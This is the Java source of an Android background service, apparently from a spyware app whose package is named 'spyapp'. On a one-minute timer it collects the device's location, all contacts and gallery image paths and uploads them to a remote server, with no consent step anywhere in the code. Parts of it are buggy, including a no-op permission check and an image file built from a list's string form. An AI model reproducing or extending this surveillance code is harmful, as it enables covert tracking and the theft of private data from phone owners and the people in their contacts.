package kkactive_india.in.spyapp;

import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.google.gson.Gson;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
import kkactive_india.in.spyapp.Database.DatabaseHelper;
import kkactive_india.in.spyapp.ImagesPOJO.ImgBean;
import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import kkactive_india.in.spyapp.locationPOJO.locationBean;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

public class MainService extends Service {
    String lat, lon, name, phoneNumber, id;
    SharedPreferences pref;
    SharedPreferences.Editor edit;
    List<ContactDatum> data = new ArrayList<>();
    Timer timer;
    ConnectionDetector cd;
    ArrayList<String> galleryImageUrls;
    File file;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);


        pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
        edit = pref.edit();

        cd = new ConnectionDetector(getApplication());


        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {


                EasyLocationMod easyLocationMod = new EasyLocationMod(getApplicationContext());
                if (ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_COARSE_LOCATION);
                }

                double[] l = easyLocationMod.getLatLong();
                lat = String.valueOf(l[0]);
                lon = String.valueOf(l[1]);

                Log.d("latLon", lat);



       /* ActivityCompat.requestPermissions(getApplicationContext(),
                new String[]{android.Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                1);*/
                // String strOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
                String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
                StringBuffer sb = new StringBuffer();
                Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                sb.append("Contact Details :");

                data = new ArrayList<>();

                while (phones.moveToNext()) {
                    name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    //Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();

                    /*Log.d("names", name);
                    Log.d("Phones", phoneNumber);
                    //textView.setText("\n Name:" + name +"\nNumber:" + phoneNumber );

                    sb.append(" \nName:--- " + name + "\nPhone Number:--- " + phoneNumber);
                    sb.append("\n----------------------------------");*/


                    /*ContactDatum person = new ContactDatum();
                    person.setName(name);
                    person.setMobile(phoneNumber);
                    data.add(person);*/

                    DatabaseHelper db = new DatabaseHelper(getApplicationContext());

                    Boolean result = db.insertContacts(name,phoneNumber);

                    Log.d("gayaDatabaseMai", String.valueOf(result));


                }

//        contactApi();

                phones.close();


                latLonApi();
                contactApi();




                final String[] columns = {MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID};//get all columns of type images
                final String orderBy = MediaStore.Images.Media.DATE_TAKEN;//order data by date

                Cursor imagecursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null,
                        null, orderBy + " DESC");//get all data in Cursor by sorting in DESC order

                galleryImageUrls = new ArrayList<String>();

                for (int i = 0; i < imagecursor.getCount(); i++) {
                    imagecursor.moveToPosition(i);
                    int dataColumnIndex = imagecursor.getColumnIndex(MediaStore.Images.Media.DATA);//get column index
                    galleryImageUrls.add(imagecursor.getString(dataColumnIndex));//get Image from column index
                }
                Log.e("fatch in", String.valueOf(galleryImageUrls));

                file = new File(String.valueOf(galleryImageUrls));

                Log.e("ImageFiles",String.valueOf(file));

                images();


            }
        }, 0, 1000 * 60);


        return START_STICKY;
    }

    public byte[] getBytes(InputStream is) throws IOException {
        ByteArrayOutputStream byteBuff = new ByteArrayOutputStream();

        int buffSize = 1024;
        byte[] buff = new byte[buffSize];

        int len = 0;
        while ((len = is.read(buff)) != -1) {
            byteBuff.write(buff, 0, len);
        }

        return byteBuff.toByteArray();
    }

    public void images(){
      if (cd.isConnectingToInternet()){


          MultipartBody.Part body1 = null;

          RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);

          long imagename = System.currentTimeMillis();

          String strName = imagename + file.getName();

          Log.d("asdasdasd" , strName);

          body1 = MultipartBody.Part.createFormData("img", file.getName(), reqFile1);

          Bean b = (Bean) getApplicationContext();

          Retrofit retrofit = new Retrofit.Builder()
                  .baseUrl(b.baseURL)
                  .addConverterFactory(ScalarsConverterFactory.create())
                  .addConverterFactory(GsonConverterFactory.create())
                  .build();
          Allapi cr = retrofit.create(Allapi.class);
          String id = pref.getString("id", "");
          Call<ImgBean> call = cr.images(id, body1);
          call.enqueue(new Callback<ImgBean>() {
              @Override
              public void onResponse(Call<ImgBean> call, Response<ImgBean> response) {

                  Log.d("Images", "yess Gaye");

              }

              @Override
              public void onFailure(Call<ImgBean> call, Throwable t) {

              }
          });

      }
    }


    public void latLonApi() {

        if (cd.isConnectingToInternet()) {
            Bean b = (Bean) getApplicationContext();

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(b.baseURL)
                    .addConverterFactory(ScalarsConverterFactory.create())
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
            Allapi cr = retrofit.create(Allapi.class);
            String id = pref.getString("id", "");
            Call<locationBean> call = cr.latlon(id, lat, lon);
            call.enqueue(new Callback<locationBean>() {
                @Override
                public void onResponse(Call<locationBean> call, Response<locationBean> response) {
                    Log.d("latLon", response.body().getMessage());
                }

                @Override
                public void onFailure(Call<locationBean> call, Throwable t) {
                    Log.d("FailHuaKuch?","LatLonFailHua");

                }
            });
        }
    }


    public void contactApi() {

        Log.d("asdasads", "asdjhgsadhjasd");

        if (cd.isConnectingToInternet()) {
            DatabaseHelper db = new DatabaseHelper(getApplicationContext());

            Cursor c = db.getContacts();

            if (c != null)
                while (c.moveToNext()) {

                ContactDatum person = new ContactDatum();
                    person.setName(c.getString(c.getColumnIndex("name")));
                    person.setMobile(c.getString(c.getColumnIndex("phone")));
                    data.add(person);

                }

            Bean b = (Bean) getApplicationContext();

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(b.baseURL)
                    .addConverterFactory(ScalarsConverterFactory.create())
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
            Allapi cr = retrofit.create(Allapi.class);


     /*   contactBean body = new contactBean();
        body.setContact("contact");

        ContactDatum data = new ContactDatum();

        data.setName(name);
        data.setMobile(phoneNumber);

        body.setContact(data);*/


            contactBean body = new contactBean();


            body.setContactData(data);

            Gson gsonObj = new Gson();

            String jsonStr = gsonObj.toJson(body);


            Log.d("dgfdh", jsonStr);
           // Log.d("dgfdh", id);

            String id = pref.getString("id", "");
            Call<contactBean> call = cr.contact(id, jsonStr);
            call.enqueue(new Callback<contactBean>() {
                @Override
                public void onResponse(Call<contactBean> call, Response<contactBean> response) {
                    Log.d("contactsHai", "blkl hai bhai");

                }

                @Override
                public void onFailure(Call<contactBean> call, Throwable t) {
                    Log.d("FailHuaKuch?","ContactFailHua");

                }
            });
        }

    }


}
